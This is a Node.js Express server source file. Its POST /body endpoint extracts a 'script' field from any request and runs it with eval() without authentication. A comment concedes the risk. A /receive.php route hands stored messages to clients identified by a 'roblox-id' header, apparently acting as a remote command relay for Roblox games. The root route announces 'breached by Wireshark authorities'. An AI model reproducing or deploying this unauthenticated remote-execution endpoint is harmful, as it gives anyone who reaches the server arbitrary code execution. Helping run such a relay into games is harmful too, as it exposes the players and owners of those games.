const express = require('express');
const fs = require('fs');

const app = express();

// The message that will be sent back to every client and also logged to the console
const BREACH_MESSAGE = 'breached by Wireshark authorities';
const MESSAGE_FILE = './messages.json';
const BODY_FILE = './body.txt';

const port = process.env.PORT || 3000;

// Middleware to parse request bodies
app.use(express.json()); // For parsing application/json
app.use(express.text()); // For parsing plain text bodies
app.use(express.raw({ type: '*/*' })); // To handle raw data, this could be used for binary inputs

// Default route
app.get('/', (req, res) => {
  console.log(`Received request from ${req.socket.remoteAddress}`);
  console.log(`Responding with breach notice: ${BREACH_MESSAGE}`);
  res.type('text/plain').send(BREACH_MESSAGE);
});

// POST endpoint to write body to a file and execute a script if present
app.post('/body', (req, res) => {
    console.log("Received POST request:", req.body);

    // Reject body if it contains the breach message
    if (typeof req.body === 'string' && req.body.includes(BREACH_MESSAGE)) {
        console.log('Rejected breach message');
        return res.status(400).json({ success: false, error: 'Breach message detected, request denied.' });
    }

    try {
        // If the body is not a string, convert it to a string
        const body = typeof req.body === 'string' ? req.body : JSON.stringify(req.body, null, 2);

        // Do not accept or echo the exact breach message
        if (typeof body === 'string' && body.trim() === BREACH_MESSAGE) {
            console.log('Rejected attempt to post the breach message to /body');
            return res.status(400).json({ success: false, error: 'Forbidden body content' });
        }

        // Write the body to the body.txt file
        fs.writeFileSync(BODY_FILE, body, 'utf8');
        console.log(`Body written to ${BODY_FILE}`);

        // Check if there is a "script" field in the request body
        const scriptMatch = body.match(/"script":\s*"([^"]+)"/);
        if (scriptMatch && scriptMatch[1]) {
            const script = scriptMatch[1];

            // WARNING: Using eval() or Function() to execute user-generated code is a security risk.
            try {
                console.log("Executing script:", script);
                eval(script);  // Executes the script dynamically
                // Alternatively, you could use Function() if you want to create a new function from the script:
                // new Function(script)(); 
            } catch (executionError) {
                console.error("Error executing script:", executionError);
                return res.status(500).json({ success: false, error: 'Error executing the script.' });
            }
        }

        res.json({ success: true, message: 'Body written to file and script executed (if present).' });
    } catch (err) {
        console.error('Error writing body to file:', err);
        res.status(500).json({ success: false, error: err.message });
    }
});

// Receive endpoint for Roblox scripts (if needed)
app.get('/receive.php', async (req, res) => {
    const userAgent = req.headers['user-agent'];
    console.log("Received request from:", userAgent);  // Log the user-agent for debugging

    // If the user-agent contains Mozilla, ignore it (Roblox doesn't send Mozilla user-agent)
    if (userAgent && userAgent.includes('Mozilla')) {
        return;
    }

    const id = req.headers['roblox-id'];
    if (!id) { return }

    res.type('application/json');

    if (!fs.existsSync(MESSAGE_FILE)) {
        return res.json([]);
    }

    try {
        const fileContent = fs.readFileSync(MESSAGE_FILE, 'utf8');
        if (!fileContent) {
            return res.json([]);
        }

        // Check if the content contains the breach message and reject it
        if (fileContent.includes(BREACH_MESSAGE)) {
            console.log('Breach message detected in content, returning empty array');
            return res.json([]);
        }

        // Try to parse JSON and remove any occurrences of the breach message
        try {
            const parsed = JSON.parse(fileContent);

            const sanitize = (value) => {
                if (typeof value === 'string') {
                    return value === BREACH_MESSAGE ? null : value;
                }
                if (Array.isArray(value)) {
                    return value
                        .map(sanitize)
                        .filter((v) => v !== null && v !== undefined);
                }
                if (value && typeof value === 'object') {
                    const out = {};
                    Object.keys(value).forEach((k) => {
                        const v = sanitize(value[k]);
                        if (v !== null && v !== undefined) out[k] = v;
                    });
                    return out;
                }
                return value;
            };

            const safe = sanitize(parsed);
            return res.type('application/json').send(JSON.stringify(safe));
        } catch (e) {
            // Not JSON — treat as text. If it exactly matches the breach message, don't return it.
            const text = fileContent.toString();
            if (text.trim() === BREACH_MESSAGE) {
                return res.json([]);
            }

            // Otherwise, remove any plain occurrences of the breach message
            const cleaned = text.split(BREACH_MESSAGE).join('');
            return res.type('application/json').send(cleaned);
        }
    } catch (err) {
        res.json([]);
    }
});

// Start the server
app.listen(port, () => {
  console.log(`Server is listening on http://localhost:${port}/`);
  console.log('Press Ctrl+C to stop the server.');
});